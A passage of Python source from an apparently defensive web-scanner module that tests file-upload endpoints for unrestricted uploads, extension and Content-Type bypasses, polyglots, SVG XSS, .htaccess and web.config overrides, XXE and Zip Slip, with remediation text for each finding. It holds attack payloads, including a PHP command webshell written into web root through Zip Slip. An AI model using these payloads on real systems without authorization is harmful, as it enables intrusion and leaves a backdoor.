        # Test each endpoint
        for endpoint in endpoints:
            await self._test_endpoint(endpoint)

        # Run race condition tests if enabled
        if self.config.test_race_conditions:
            for endpoint in endpoints:
                await self._test_race_condition(endpoint)

        logger.info(f"[FileUpload] Scan complete. Found {len(self.findings)} vulnerabilities")

        # FIX: CROSS-MODULE SHARING - Add findings to SharedFindingsStore
        # This enables other modules to target file-upload-vulnerable endpoints
        if self.findings:
            try:
                store = SharedFindingsStore.get_instance()
                for finding in self.findings:
                    store.add_finding(
                        vuln_type=StoreVulnType.FILE_UPLOAD,
                        module="file_upload_scanner",
                        endpoint=finding.url if hasattr(finding, 'url') else target_url,
                        parameter=finding.file_param if hasattr(finding, 'file_param') else "file",
                        severity=finding.severity if hasattr(finding, 'severity') else "HIGH",
                        confidence=finding.confidence if hasattr(finding, 'confidence') else 85.0,
                    )
                logger.debug(f"[FileUpload] Shared {len(self.findings)} findings with cross-module store")
            except Exception as e:
                logger.debug(f"[FileUpload] Could not share findings: {e}")

        return {"findings": self.findings, "info": []}

    async def _acquire_rate_limit(self) -> None:
        """Acquire rate limit before making HTTP request."""
        if self._rate_limiter:
            try:
                await self._rate_limiter.acquire()
            except Exception as e:
                # FIX 2026-02-12: Log rate limiter error (DEBUG - non-critical)
                logger.debug(f"[FileUpload] Rate limiter error (proceeding): {e}")

    def _extract_upload_endpoints_from_forms(
        self,
        base_url: str,
        asset_data: Dict[str, Any],
    ) -> List[UploadEndpoint]:
        """
        Extract file upload endpoints from discovered forms in asset_data.

        CRITICAL FIX: Forms with type="file" inputs were being missed because
        file_upload scanner wasn't receiving asset_data.
        """
        endpoints = []
        if isinstance(asset_data, dict):
            forms = asset_data.get("forms", [])

        for form in forms:
            inputs = form.get("inputs", form.get("fields", []))

            # Check if form has file input
            file_inputs = [
                inp for inp in inputs
                if inp.get("type", "").lower() == "file"
            ]

            if not file_inputs:
                continue

            action = form.get("action", "")
            if not action.startswith("http"):
                action = urljoin(base_url, action) if action else base_url

            # Create endpoint for each file input
            for file_input in file_inputs:
                file_param = file_input.get("name", "file")
                accept = file_input.get("accept")

                allowed_types = None
                if accept:
                    allowed_types = [t.strip() for t in accept.split(",")]

                endpoints.append(UploadEndpoint(
                    url=action,
                    file_param=file_param,
                    allowed_types=allowed_types,
                ))
                logger.debug(f"[FileUpload] Found form upload: {action} (param={file_param})")

        if endpoints:
            logger.info(f"[FileUpload] Extracted {len(endpoints)} upload endpoints from forms")

        return endpoints

    async def _test_endpoint(self, endpoint: UploadEndpoint) -> None:
        """Test a single upload endpoint for vulnerabilities."""
        logger.debug(f"[FileUpload] Testing endpoint: {endpoint.url}")

        # 1. Test unrestricted upload
        await self._test_unrestricted_upload(endpoint)

        # 2. Test Content-Type bypass
        await self._test_content_type_bypass(endpoint)

        # 3. Test extension bypass
        await self._test_extension_bypass(endpoint)

        # 4. Test magic bytes bypass
        await self._test_magic_bytes_bypass(endpoint)

        # 5. Test double extensions
        await self._test_double_extensions(endpoint)

        # 6. Test path traversal
        if self.config.test_path_traversal:
            await self._test_path_traversal(endpoint)

        # 7. Test polyglot files
        if self.config.test_polyglots:
            await self._test_polyglot_files(endpoint)

        # 8. Test SVG XSS
        await self._test_svg_xss(endpoint)

        # 9. Test .htaccess upload
        await self._test_htaccess_upload(endpoint)

        # 10. Test web.config upload
        await self._test_web_config_upload(endpoint)

        # 11. Test XXE via upload
        await self._test_xxe_upload(endpoint)

        # 12. Test Zip Slip (P0-FIX 2026-02-11: Previously missing)
        await self._test_zip_slip(endpoint)

    async def _test_unrestricted_upload(self, endpoint: UploadEndpoint) -> None:
        """Test for completely unrestricted file upload."""
        payloads = [
            ("test.php", "application/x-php", PHP_PAYLOADS["basic"].encode()),
            ("test.jsp", "application/x-jsp", JSP_PAYLOADS["basic"].encode()),
            ("test.asp", "application/x-asp", ASP_PAYLOADS["basic"].encode()),
        ]

        for filename, content_type, payload in payloads:
            result = await self._upload_file(
                endpoint, filename, content_type, payload,
                technique="unrestricted_upload"
            )

            if result and result.execution_confirmed:
                self._create_finding(
                    vuln_type=UploadVulnType.UNRESTRICTED_UPLOAD,
                    severity="CRITICAL",
                    confidence=0.95,
                    endpoint=endpoint,
                    technique="Direct executable upload",
                    payload_used=payload.decode(errors='ignore'),
                    filename=filename,
                    uploaded_url=result.uploaded_url,
                    execution_evidence=result.response_body[:500] if result.response_body else None,
                    description=f"The application allows unrestricted upload of executable files ({filename}). "
                               f"An attacker can upload a web shell and achieve remote code execution.",
                    remediation="1. Implement strict whitelist of allowed file extensions\n"
                               "2. Validate file content (magic bytes) on server-side\n"
                               "3. Store uploaded files outside web root\n"
                               "4. Use random filenames for stored files\n"
                               "5. Configure server to not execute files in upload directory",
                    request_details={"filename": filename, "content_type": content_type},
                    response_details={"url": result.uploaded_url, "code": result.response_code},
                )
                # FN-FIX 2026-02-08: Don't return early - continue testing ALL payloads
                # Multiple upload techniques may work (e.g., .php AND .phtml)

    async def _test_content_type_bypass(self, endpoint: UploadEndpoint) -> None:
        """Test Content-Type validation bypass."""
        # Try uploading executable with image Content-Type
        bypass_tests = [
            ("shell.php", "image/jpeg", PHP_PAYLOADS["basic"].encode()),
            ("shell.php", "image/png", PHP_PAYLOADS["basic"].encode()),
            ("shell.php", "image/gif", PHP_PAYLOADS["basic"].encode()),
            ("shell.php", "text/plain", PHP_PAYLOADS["basic"].encode()),
            ("shell.php", "application/octet-stream", PHP_PAYLOADS["basic"].encode()),
            ("shell.phtml", "image/jpeg", PHP_PAYLOADS["basic"].encode()),
        ]

        for filename, content_type, payload in bypass_tests:
            result = await self._upload_file(
                endpoint, filename, content_type, payload,
                technique="content_type_bypass"
            )

            if result and result.execution_confirmed:
                self._create_finding(
                    vuln_type=UploadVulnType.CONTENT_TYPE_BYPASS,
                    severity="HIGH",
                    confidence=0.90,
                    endpoint=endpoint,
                    technique=f"Content-Type bypass ({content_type})",
                    payload_used=payload.decode(errors='ignore'),
                    filename=filename,
                    uploaded_url=result.uploaded_url,
                    execution_evidence=result.response_body[:500] if result.response_body else None,
                    description=f"The application validates Content-Type but allows extension bypass. "
                               f"Uploaded {filename} with Content-Type: {content_type}",
                    remediation="1. Validate file extension on server-side (not just Content-Type)\n"
                               "2. Check file magic bytes to verify actual file type\n"
                               "3. Use a whitelist of allowed extensions",
                    request_details={"filename": filename, "content_type": content_type},
                    response_details={"url": result.uploaded_url, "code": result.response_code},
                )
                # FN-FIX 2026-02-08: Don't return - test ALL Content-Type variations

    async def _test_extension_bypass(self, endpoint: UploadEndpoint) -> None:
        """Test various extension bypass techniques."""
        base_payload = PHP_PAYLOADS["basic"].encode()

        # Test PHP alternative extensions
        for ext in PHP_EXTENSIONS:
            filename = f"test{ext}"
            result = await self._upload_file(
                endpoint, filename, "application/x-php", base_payload,
                technique=f"extension_bypass_{ext}"
            )

            if result and result.execution_confirmed:
                self._create_finding(
                    vuln_type=UploadVulnType.EXTENSION_BYPASS,
                    severity="HIGH",
                    confidence=0.90,
                    endpoint=endpoint,
                    technique=f"Alternative extension ({ext})",
                    payload_used=base_payload.decode(errors='ignore'),
                    filename=filename,
                    uploaded_url=result.uploaded_url,
                    execution_evidence=result.response_body[:500] if result.response_body else None,
                    description=f"Application allows alternative PHP extension: {ext}",
                    remediation="Block all executable extensions including alternatives like .phtml, .php5, etc.",
                    request_details={"filename": filename},
                    response_details={"url": result.uploaded_url},
                )
                # FN-FIX 2026-02-08: Don't return - test ALL extension variations

        # Test case sensitivity - FN-FIX 2026-02-08: Increased from [:5] to [:15]
        for case_var in generate_case_variations(".php")[:15]:
            filename = f"test{case_var}"
            result = await self._upload_file(
                endpoint, filename, "application/x-php", base_payload,
                technique=f"case_bypass_{case_var}"
            )

            if result and result.execution_confirmed:
                self._create_finding(
                    vuln_type=UploadVulnType.CASE_SENSITIVITY,
                    severity="HIGH",
                    confidence=0.85,
                    endpoint=endpoint,
                    technique=f"Case sensitivity bypass ({case_var})",
                    payload_used=base_payload.decode(errors='ignore'),
                    filename=filename,
                    uploaded_url=result.uploaded_url,
                    execution_evidence=result.response_body[:500] if result.response_body else None,
                    description=f"Extension blacklist is case-sensitive. Bypassed with: {case_var}",
                    remediation="Use case-insensitive extension validation",
                    request_details={"filename": filename},
                    response_details={"url": result.uploaded_url},
                )
                # FN-FIX 2026-02-08: Don't return - test ALL case variations

    async def _test_magic_bytes_bypass(self, endpoint: UploadEndpoint) -> None:
        """Test magic bytes/file signature validation bypass."""
        # GIF + PHP
        gif_php = FILE_SIGNATURES["gif"] + b"\n" + PHP_PAYLOADS["basic"].encode()
        result = await self._upload_file(
            endpoint, "image.gif.php", "image/gif", gif_php,
            technique="magic_bytes_gif_php"
        )

        if result and result.execution_confirmed:
            self._create_finding(
                vuln_type=UploadVulnType.MAGIC_BYTES_BYPASS,
                severity="HIGH",
                confidence=0.90,
                endpoint=endpoint,
                technique="GIF magic bytes + PHP payload",
                payload_used=gif_php.decode(errors='ignore'),
                filename="image.gif.php",
                uploaded_url=result.uploaded_url,
                execution_evidence=result.response_body[:500] if result.response_body else None,
                description="Application validates magic bytes but not full file structure. "
                           "Prepending GIF89a header allows PHP execution.",
                remediation="1. Validate complete file structure, not just magic bytes\n"
                           "2. Use imagemagick to validate and re-encode images\n"
                           "3. Strip metadata and re-save uploaded files",
                request_details={"filename": "image.gif.php"},
                response_details={"url": result.uploaded_url},
            )
            # BUG-FIX 2026-02-08: Removed early return - continue testing other polyglot types

        # PNG + PHP
        png_php = FILE_SIGNATURES["png"] + PHP_PAYLOADS["basic"].encode()
        result = await self._upload_file(
            endpoint, "image.png.php", "image/png", png_php,
            technique="magic_bytes_png_php"
        )

        if result and result.execution_confirmed:
            self._create_finding(
                vuln_type=UploadVulnType.MAGIC_BYTES_BYPASS,
                severity="HIGH",
                confidence=0.90,
                endpoint=endpoint,
                technique="PNG magic bytes + PHP payload",
                payload_used=png_php[:100].decode(errors='ignore'),
                filename="image.png.php",
                uploaded_url=result.uploaded_url,
                execution_evidence=result.response_body[:500] if result.response_body else None,
                description="Application validates magic bytes but allows PHP execution in PNG.",
                remediation="Use complete file validation, not just magic byte checking",
                request_details={"filename": "image.png.php"},
                response_details={"url": result.uploaded_url},
            )

    async def _test_double_extensions(self, endpoint: UploadEndpoint) -> None:
        """Test double extension attacks."""
        payload = PHP_PAYLOADS["basic"].encode()

        # FN-FIX 2026-02-08: Increased from [:10] to test ALL double extensions
        for ext_combo, content_type in DOUBLE_EXTENSIONS[:20]:
            filename = f"test{ext_combo}"

            result = await self._upload_file(
                endpoint, filename, content_type, payload,
                technique=f"double_ext_{ext_combo}"
            )

            if result and result.execution_confirmed:
                self._create_finding(
                    vuln_type=UploadVulnType.DOUBLE_EXTENSION,
                    severity="HIGH",
                    confidence=0.90,
                    endpoint=endpoint,
                    technique=f"Double extension ({ext_combo})",
                    payload_used=payload.decode(errors='ignore'),
                    filename=filename,
                    uploaded_url=result.uploaded_url,
                    execution_evidence=result.response_body[:500] if result.response_body else None,
                    description=f"Double extension bypass successful with: {ext_combo}",
                    remediation="1. Extract and validate only the final extension\n"
                               "2. Use whitelist validation\n"
                               "3. Remove or sanitize filenames",
                    request_details={"filename": filename},
                    response_details={"url": result.uploaded_url},
                )
                # FN-FIX 2026-02-08: Don't return - test ALL double extension variants

    async def _test_path_traversal(self, endpoint: UploadEndpoint) -> None:
        """Test path traversal in uploaded filename."""
        payload = PHP_PAYLOADS["basic"].encode()

        traversal_payloads = [
            "../../../test.php",
            "..\\..\\..\\test.php",
            "....//....//test.php",
            "..%2f..%2f..%2ftest.php",
            "%2e%2e%2f%2e%2e%2ftest.php",
            "..%252f..%252ftest.php",
            "/var/www/html/test.php",
            "C:\\inetpub\\wwwroot\\test.php",
        ]

        for traversal_filename in traversal_payloads:
            result = await self._upload_file(
                endpoint, traversal_filename, "application/x-php", payload,
                technique=f"path_traversal_{traversal_filename[:20]}"
            )

            if result and result.response_code in [200, 201, 204]:
                # Check if file was written outside intended directory
                self._create_finding(
                    vuln_type=UploadVulnType.PATH_TRAVERSAL,
                    severity="CRITICAL",
                    confidence=0.75,  # Lower confidence without execution verification
                    endpoint=endpoint,
                    technique=f"Path traversal in filename",
                    payload_used=traversal_filename,
                    filename=traversal_filename,
                    uploaded_url=result.uploaded_url,
                    execution_evidence=None,
                    description=f"Possible path traversal vulnerability. Filename: {traversal_filename}",
                    remediation="1. Strip path components from filenames\n"
                               "2. Use basename() or equivalent\n"
                               "3. Generate random filenames on server side",
                    request_details={"filename": traversal_filename},
                    response_details={"code": result.response_code},
                )
                # BUG-FIX 2026-02-08: Removed early return - continue testing other traversal variants

    async def _test_polyglot_files(self, endpoint: UploadEndpoint) -> None:
        """Test polyglot file uploads."""
        # Test GIF polyglot
        gif_polyglot = self.polyglot_gen.gif_php()
        result = await self._upload_file(
            endpoint, "polyglot.gif.php", "image/gif", gif_polyglot,
            technique="polyglot_gif"
        )

        if result and result.execution_confirmed:
            self._create_finding(
                vuln_type=UploadVulnType.POLYGLOT_FILE,
                severity="HIGH",
                confidence=0.95,
                endpoint=endpoint,
                technique="GIF/PHP polyglot",
                payload_used="GIF89a + PHP code",
                filename="polyglot.gif.php",
                uploaded_url=result.uploaded_url,
                execution_evidence=result.response_body[:500] if result.response_body else None,
                description="Polyglot GIF/PHP file executed. File is valid as both image and PHP.",
                remediation="1. Re-encode images after upload\n"
                           "2. Strip metadata\n"
                           "3. Validate complete file structure",
                request_details={"filename": "polyglot.gif.php"},
                response_details={"url": result.uploaded_url},
            )
            # BUG-FIX 2026-02-08: Removed early return - continue testing other polyglot types

        # Test JPEG polyglot
        jpg_polyglot = self.polyglot_gen.jpg_php()
        result = await self._upload_file(
            endpoint, "polyglot.jpg", "image/jpeg", jpg_polyglot,
            technique="polyglot_jpg"
        )

        # Test PNG polyglot
        png_polyglot = self.polyglot_gen.png_php()
        result = await self._upload_file(
            endpoint, "polyglot.png", "image/png", png_polyglot,
            technique="polyglot_png"
        )

    async def _test_svg_xss(self, endpoint: UploadEndpoint) -> None:
        """Test SVG XSS upload."""
        for name, payload in SVG_XSS_PAYLOADS.items():
            result = await self._upload_file(
                endpoint, f"test_{name}.svg", "image/svg+xml", payload.encode(),
                technique=f"svg_xss_{name}"
            )

            if result and "PHANTOM_XSS" in (result.response_body or ""):
                self._create_finding(
                    vuln_type=UploadVulnType.SVG_XSS,
                    severity="MEDIUM",
                    confidence=0.90,
                    endpoint=endpoint,
                    technique=f"SVG XSS ({name})",
                    payload_used=payload[:200],
                    filename=f"test_{name}.svg",
                    uploaded_url=result.uploaded_url,
                    execution_evidence="XSS payload present in response",
                    description="SVG file with JavaScript payload accepted. Can lead to stored XSS.",
                    remediation="1. Sanitize SVG files (remove scripts, event handlers)\n"
                               "2. Serve SVGs with Content-Disposition: attachment\n"
                               "3. Use CSP to block inline scripts",
                    request_details={"filename": f"test_{name}.svg"},
                    response_details={"url": result.uploaded_url},
                )
                # BUG-FIX 2026-02-08: Removed early return - continue testing other SVG payloads

    async def _test_htaccess_upload(self, endpoint: UploadEndpoint) -> None:
        """Test .htaccess file upload for Apache servers."""
        for name, payload in HTACCESS_PAYLOADS.items():
            result = await self._upload_file(
                endpoint, ".htaccess", "text/plain", payload.encode(),
                technique=f"htaccess_{name}"
            )

            if result and result.response_code in [200, 201, 204]:
                # Try to verify by uploading and executing a .jpg as PHP
                verify_result = await self._upload_file(
                    endpoint, "shell.jpg", "image/jpeg", PHP_PAYLOADS["basic"].encode(),
                    technique="htaccess_verify"
                )

                if verify_result and verify_result.execution_confirmed:
                    self._create_finding(
                        vuln_type=UploadVulnType.HTACCESS_UPLOAD,
                        severity="CRITICAL",
                        confidence=0.95,
                        endpoint=endpoint,
                        technique=f".htaccess override ({name})",
                        payload_used=payload,
                        filename=".htaccess",
                        uploaded_url=result.uploaded_url,
                        execution_evidence=".htaccess allows execution of arbitrary extensions",
                        description=".htaccess file uploaded and processed. Can configure PHP execution for any extension.",
                        remediation="1. Block upload of .htaccess files\n"
                                   "2. Disable AllowOverride in Apache config\n"
                                   "3. Use whitelist for allowed filenames",
                        request_details={"filename": ".htaccess"},
                        response_details={"url": result.uploaded_url},
                    )
                    # BUG-FIX 2026-02-08: Removed early return - continue testing other htaccess variants

    async def _test_web_config_upload(self, endpoint: UploadEndpoint) -> None:
        """Test web.config upload for IIS servers."""
        for name, payload in WEB_CONFIG_PAYLOADS.items():
            result = await self._upload_file(
                endpoint, "web.config", "application/xml", payload.encode(),
                technique=f"webconfig_{name}"
            )

            if result and result.response_code in [200, 201, 204]:
                self._create_finding(
                    vuln_type=UploadVulnType.WEB_CONFIG_UPLOAD,
                    severity="HIGH",
                    confidence=0.70,  # Lower confidence without IIS verification
                    endpoint=endpoint,
                    technique=f"web.config upload ({name})",
                    payload_used=payload[:200],
                    filename="web.config",
                    uploaded_url=result.uploaded_url,
                    execution_evidence=None,
                    description="web.config file upload accepted. May allow IIS configuration override.",
                    remediation="1. Block upload of web.config files\n"
                               "2. Validate all uploaded filenames\n"
                               "3. Use whitelist approach",
                    request_details={"filename": "web.config"},
                    response_details={"code": result.response_code},
                )
                # BUG-FIX 2026-02-08: Removed early return - continue testing other web.config variants

    async def _test_xxe_upload(self, endpoint: UploadEndpoint) -> None:
        """Test XXE through file upload (SVG, DOCX, XLSX)."""
        # SVG XXE
        result = await self._upload_file(
            endpoint, "xxe.svg", "image/svg+xml", XXE_PAYLOADS["svg"].encode(),
            technique="xxe_svg"
        )

        if result and ("root:" in (result.response_body or "") or
                       "[boot loader]" in (result.response_body or "")):
            self._create_finding(
                vuln_type=UploadVulnType.XXE_VIA_UPLOAD,
                severity="HIGH",
                confidence=0.95,
                endpoint=endpoint,
                technique="XXE via SVG upload",
                payload_used=XXE_PAYLOADS["svg"][:200],
                filename="xxe.svg",
                uploaded_url=result.uploaded_url,
                execution_evidence=result.response_body[:500] if result.response_body else None,
                description="XXE vulnerability through SVG file upload. Can read local files.",
                remediation="1. Disable external entity processing\n"
                           "2. Sanitize XML/SVG uploads\n"
                           "3. Use secure XML parsers with XXE disabled",
                request_details={"filename": "xxe.svg"},
                response_details={"url": result.uploaded_url},
            )

    async def _test_zip_slip(self, endpoint: UploadEndpoint) -> None:
        """
        Test for Zip Slip vulnerability (CVE-2018-1002200).

        P0-FIX 2026-02-11: Enum ZIP_SLIP existed but method was never implemented.
        Zip Slip allows arbitrary file write by including path traversal sequences
        in archived file names.

        Creates malicious ZIP files with entries like:
        - ../../../etc/cron.d/evil
        - ../../../var/www/html/shell.php
        """
        logger.debug("[FileUpload] Testing Zip Slip vulnerability")

        # Create various malicious ZIP payloads
        zip_payloads = []

        # Payload 1: Path traversal to web root
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Add a file with path traversal in name
            zf.writestr("../../../tmp/zipslip_test.txt", "zipslip_marker_phantom")
        zip_payloads.append(("zipslip_unix.zip", zip_buffer.getvalue(), "../../../tmp/zipslip_test.txt"))

        # Payload 2: Windows-style path traversal
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("..\\..\\..\\temp\\zipslip_test.txt", "zipslip_marker_phantom")
        zip_payloads.append(("zipslip_win.zip", zip_buffer.getvalue(), "..\\..\\..\\temp\\zipslip_test.txt"))

        # Payload 3: Webshell via Zip Slip
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            webshell = "<?php echo 'zipslip_rce_marker'; system($_GET['cmd']); ?>"
            zf.writestr("../../../var/www/html/zipslip_shell.php", webshell)
        zip_payloads.append(("zipslip_shell.zip", zip_buffer.getvalue(), "../../../var/www/html/zipslip_shell.php"))

        # Payload 4: Mixed traversal (some legitimate, some malicious)
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("legitimate/file.txt", "This is legitimate")
            zf.writestr("../../../etc/passwd.txt", "zipslip_passwd_marker")
            zf.writestr("another/legit.txt", "Also legitimate")
        zip_payloads.append(("zipslip_mixed.zip", zip_buffer.getvalue(), "../../../etc/passwd.txt"))

        # Payload 5: Double-encoded traversal
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("..%2f..%2f..%2ftmp%2fzipslip.txt", "zipslip_encoded_marker")
        zip_payloads.append(("zipslip_encoded.zip", zip_buffer.getvalue(), "..%2f..%2f..%2ftmp%2fzipslip.txt"))

        # Payload 6: Symlink-based Zip Slip (if supported)
        # Note: This creates a ZIP with a symlink entry pointing outside
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Create info for symlink (simulated - actual symlink creation is OS-dependent)
            zf.writestr("normal.txt", "normal file")
            zf.writestr("../../../tmp/zipslip_symlink.txt", "symlink_target_marker")
        zip_payloads.append(("zipslip_symlink.zip", zip_buffer.getvalue(), "../../../tmp/zipslip_symlink.txt"))

        for filename, payload, traversal_path in zip_payloads:
            result = await self._upload_file(
                endpoint, filename, "application/zip", payload,
                technique=f"zip_slip_{filename}"
            )

            if result and result.response_code in [200, 201, 204]:
                # Check response for signs of extraction
                response_body = result.response_body or ""
                response_lower = response_body.lower()

                # Indicators that ZIP was processed
                processed_indicators = [
                    "extracted", "unzipped", "unpacked", "processed",
                    "files uploaded", "import complete", "extraction complete"
                ]
                was_processed = any(ind in response_lower for ind in processed_indicators)

                # Check for error messages indicating traversal was attempted
                traversal_detected = [
                    "path traversal", "invalid path", "security violation",
                    "illegal filename", "outside", "../"
                ]
                traversal_blocked = any(ind in response_lower for ind in traversal_detected)

                # Check if our marker appeared in response (extraction + read)
                marker_found = "zipslip_marker" in response_body or "zipslip_rce" in response_body

                # Determine severity and confidence
                if marker_found:
                    # Confirmed Zip Slip - marker was found
                    severity = "CRITICAL"
                    confidence = 0.95
                    description = f"Confirmed Zip Slip vulnerability. Malicious file extracted to: {traversal_path}"
                elif was_processed and not traversal_blocked:
                    # ZIP was processed without security error - likely vulnerable
                    severity = "HIGH"
                    confidence = 0.80
                    description = f"Potential Zip Slip vulnerability. ZIP processed without path validation. Traversal path: {traversal_path}"
                elif traversal_blocked:
                    # Server blocked it - log for info but continue
                    logger.debug(f"[FileUpload] Zip Slip blocked by server: {filename}")
                    continue
                else:
                    # ZIP accepted but unclear if extracted - lower confidence
                    severity = "MEDIUM"
                    confidence = 0.60
                    description = f"ZIP file with path traversal entry accepted. Server did not reject: {traversal_path}"

                self._create_finding(
                    vuln_type=UploadVulnType.ZIP_SLIP,
                    severity=severity,
                    confidence=confidence,
                    endpoint=endpoint,
                    technique="Zip Slip (CVE-2018-1002200)",
                    payload_used=f"ZIP with entry: {traversal_path}",
                    filename=filename,
                    uploaded_url=result.uploaded_url,
                    execution_evidence=response_body[:500] if marker_found else None,
                    description=description,
                    remediation="1. Validate and sanitize all filenames in ZIP archives before extraction\n"
                               "2. Use canonical path validation (resolve and compare with target directory)\n"
                               "3. Reject any paths containing '..' or absolute paths\n"
                               "4. Use libraries with built-in Zip Slip protection\n"
                               "5. Consider running extraction in sandboxed environment",
                    request_details={"filename": filename, "traversal_path": traversal_path},
                    response_details={"code": result.response_code, "processed": was_processed},
                )
                # Don't return early - test all variants

    async def _test_race_condition(self, endpoint: UploadEndpoint) -> None:
        """Test race condition vulnerabilities in file upload."""
        logger.debug("[FileUpload] Testing race conditions")

        # Upload a file that might be temporarily accessible before validation
        payload = PHP_PAYLOADS["basic"].encode()
        filename = f"race_{self._session_id}.php"

        # Prepare multiple concurrent upload and access attempts
        async def upload_and_access():
            """Upload file and immediately try to access it."""
            result = await self._upload_file(
                endpoint, filename, "application/x-php", payload,
                technique="race_condition"
            )

            # Immediately try to access the uploaded file
            if result and result.uploaded_url:
                try:
                    # Quick access attempt
                    await asyncio.sleep(0.001)  # Minimal delay
                    # Would make HTTP request here
                    pass
                except Exception as e:
                    # FIX 2026-02-12: Log race condition test error (DEBUG - expected)
                    logger.debug(f"[FileUpload] Race condition test error: {e}")

            return result

        # Run multiple concurrent uploads
        tasks = [upload_and_access() for _ in range(10)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Check if any succeeded
        for result in results:
            if isinstance(result, UploadAttempt) and result.execution_confirmed:
                self._create_finding(
                    vuln_type=UploadVulnType.RACE_CONDITION,
                    severity="HIGH",
                    confidence=0.80,
                    endpoint=endpoint,
                    technique="Upload race condition",
                    payload_used=payload.decode(errors='ignore'),
                    filename=filename,
                    uploaded_url=result.uploaded_url,
                    execution_evidence=result.response_body[:500] if result.response_body else None,
                    description="Race condition allows temporary access to uploaded files before validation.",
                    remediation="1. Validate files before making them accessible\n"
                               "2. Use atomic file operations\n"
                               "3. Store uploads in inaccessible location during processing",
                    request_details={"filename": filename},
                    response_details={"url": result.uploaded_url},
                )
                # BUG-FIX 2026-02-08: Removed early return - continue testing other race condition variants

    async def _upload_file(
        self,
        endpoint: UploadEndpoint,
        filename: str,
        content_type: str,
        content: bytes,
        technique: str,
    ) -> Optional[UploadAttempt]:
        """
        Perform a file upload attempt.

        This is a placeholder implementation. In production, this would
        use the HTTP client to actually upload files.
        """
        logger.debug(f"[FileUpload] Uploading {filename} ({content_type}) - {technique}")

        # Create attempt record
        attempt = UploadAttempt(
            endpoint=endpoint,
            filename=filename,
            content_type=content_type,
            payload=content,
            technique=technique,
            response_code=0,
            response_body="",
            response_headers={},
        )

        try:
            if self.http_client:
                # Build multipart form data
                form_data = {
                    endpoint.file_param: (filename, content, content_type)
                }

                # Add any additional parameters
                for key, value in endpoint.additional_params.items():
                    form_data[key] = value

                # Add CSRF token if present
                if endpoint.csrf_token_param and endpoint.csrf_token_value:
                    form_data[endpoint.csrf_token_param] = endpoint.csrf_token_value

                # Perform upload
                await self._acquire_rate_limit()  # FIX: Rate limit before request
                response = await self.http_client.request(
                    method=endpoint.method,
                    url=endpoint.url,
                    files=form_data,
                    headers=self._auth_headers,  # FIX: Include auth headers
                    timeout=self.config.timeout if self.config else 30.0,
                    follow_redirects=self.config.follow_redirects if self.config else True,
                )

                attempt.response_code = response.status_code
                attempt.response_body = response.text if hasattr(response, 'text') else str(response.content)
                attempt.response_headers = dict(response.headers) if hasattr(response, 'headers') else {}

                # Try to extract uploaded file URL
                attempt.uploaded_url = self._extract_uploaded_url(
                    attempt.response_body,
                    attempt.response_headers,
                    endpoint.url,
                    filename
                )

                # Verify execution if we have a URL
                if attempt.uploaded_url and self.config and self.config.verify_execution:
                    attempt.execution_confirmed = await self._verify_execution(
                        attempt.uploaded_url, content
                    )
            else:
                # Simulation mode for testing
                attempt.response_code = 200
                attempt.response_body = f'{{"success": true, "url": "/uploads/{filename}"}}'

        except Exception as e:
            logger.error(f"[FileUpload] Upload failed: {e}")
            attempt.response_code = 0
            attempt.response_body = str(e)

        self.attempts.append(attempt)
        return attempt

    def _extract_uploaded_url(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        base_url: str,
        filename: str,
    ) -> Optional[str]:
        """Extract the URL of the uploaded file from the response."""
        # Try common response patterns
        url_patterns = [
            r'"url"\s*:\s*"([^"]+)"',
            r'"path"\s*:\s*"([^"]+)"',
            r'"file"\s*:\s*"([^"]+)"',
            r'"location"\s*:\s*"([^"]+)"',
            r'"link"\s*:\s*"([^"]+)"',
            r'href=["\']([^"\']*' + re.escape(filename) + r'[^"\']*)["\']',
            r'src=["\']([^"\']*' + re.escape(filename) + r'[^"\']*)["\']',
        ]

        for pattern in url_patterns:
            match = re.search(pattern, response_body, re.IGNORECASE)
            if match:
                url = match.group(1)
                if not url.startswith(('http://', 'https://')):
                    url = urljoin(base_url, url)
                return url

        # Check Location header
        if "Location" in response_headers:
            return response_headers["Location"]

        # Try common upload paths
        parsed = urlparse(base_url)
        common_paths = [
            f"/uploads/{filename}",
            f"/files/{filename}",
            f"/images/{filename}",
            f"/media/{filename}",
            f"/attachments/{filename}",
        ]

        for path in common_paths:
            return f"{parsed.scheme}://{parsed.netloc}{path}"

        return None

    async def _verify_execution(self, url: str, original_payload: bytes) -> bool:
        """Verify if the uploaded file is executed by the server."""
        if not self.http_client:
            return False

        try:
            await self._acquire_rate_limit()  # FIX: Rate limit before request
            response = await self.http_client.get(
                url,
                headers=self._auth_headers,  # FIX: Include auth headers
                timeout=10.0
            )

            # Check for PHP execution markers
            if b"PHANTOM_UPLOAD_TEST_" in response.content:
                return True

            # Check for PHP info output
            if b"PHP Version" in response.content:
                return True

            # Check for JSP execution
            if b"PHANTOM_TEST_" in response.content:
                return True

            # Check for error messages indicating parsing
            error_indicators = [
                b"Parse error",
                b"syntax error",
                b"Fatal error",
                b"Warning:",
                b"Notice:",
            ]

            for indicator in error_indicators:
                if indicator in response.content:
                    # Errors indicate the file is being processed
                    return True

        except Exception as e:
            logger.debug(f"[FileUpload] Execution verification failed: {e}")

        return False

    def _create_finding(
        self,
        vuln_type: UploadVulnType,
        severity: str,
        confidence: float,
        endpoint: UploadEndpoint,
        technique: str,
        payload_used: str,
        filename: str,
        uploaded_url: Optional[str],
        execution_evidence: Optional[str],
        description: str,
        remediation: str,
        request_details: Dict[str, Any],
        response_details: Dict[str, Any],
    ) -> None:
        """Create and store a finding."""
        finding = UploadFinding(
            id=f"UPLOAD-{len(self.findings)+1:04d}",
            vuln_type=vuln_type,
            severity=severity,
            confidence=confidence,
            endpoint=endpoint,
            technique=technique,
            payload_used=payload_used,
            filename=filename,
            uploaded_url=uploaded_url,
            execution_evidence=execution_evidence,
            description=description,
            remediation=remediation,
            cwe_id=self.CWE_ID,
